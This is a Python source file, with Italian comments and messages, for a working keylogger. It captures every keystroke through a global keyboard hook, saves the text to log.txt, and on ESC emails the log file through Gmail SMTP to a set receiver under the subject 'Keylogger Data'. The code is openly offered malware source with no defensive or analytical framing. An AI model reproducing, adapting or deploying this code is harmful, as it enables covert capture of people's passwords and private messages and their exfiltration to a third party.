import keyboard
import time
import os
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication


testo_registrato = ""


EMAIL_SENDER = "sender"
EMAIL_PASSWORD = "password_for_apps"
EMAIL_RECEIVER = "receiver"


tasti_speciali = ['shift', 'alt', 'ctrl', 'left shift', 'right shift', 'left alt', 'right alt', 
                  'left ctrl', 'right ctrl', 'maiusc', 'alt gr', 'windows', 'left windows', 'right windows']

def send_email(file_path):
    try:
  
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = "Keylogger Data"

     
        body = "In allegato i dati registrati dal keylogger."
        msg.attach(MIMEText(body, 'plain'))

       
        with open(file_path, 'rb') as f:
            attachment = MIMEApplication(f.read())
            attachment.add_header('Content-Disposition', 'attachment', filename='log.txt')
            msg.attach(attachment)

       
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls() 
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()

        print("Email inviata con successo!")
    except Exception as e:
        print(f"Errore durante l'invio dell'email: {str(e)}")
        print("Assicurati di aver inserito la password per le app di Gmail corretta")

def on_press(key):
    global testo_registrato
   
    if hasattr(key, 'name'):
      
        if key.name in tasti_speciali:
            return
            
        if key.name == 'esc':
            percorso_file = save_to_file()
            if percorso_file:
                send_email(percorso_file)
            print("\nProgramma terminato.")
            sys.exit()
        elif key.name == 'backspace':
         
            testo_registrato = testo_registrato[:-1]
            print("\b \b", end="", flush=True) 
        elif key.name == 'space':
            testo_registrato += " "
            print(" ", end="", flush=True)
        elif key.name == 'enter':
            testo_registrato += "\n"
            print("\n", end="", flush=True)
        else:
            testo_registrato += key.name
            print(f"{key.name}", end="", flush=True)
    else:
        testo_registrato += str(key)
        print(f"{key}", end="", flush=True)

def save_to_file():
    try:
       
        percorso_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log.txt")
        
      
        with open(percorso_file, "w", encoding="utf-8") as file:
            file.write(testo_registrato)
        print(f"\nTesto salvato nel file: {percorso_file}")
        return percorso_file
    except Exception as e:
        print(f"\nErrore durante il salvataggio del file: {str(e)}")
        return None


keyboard.on_press(on_press)

print("Inizia a digitare (premi ESC per terminare e salvare)...")
keyboard.wait()



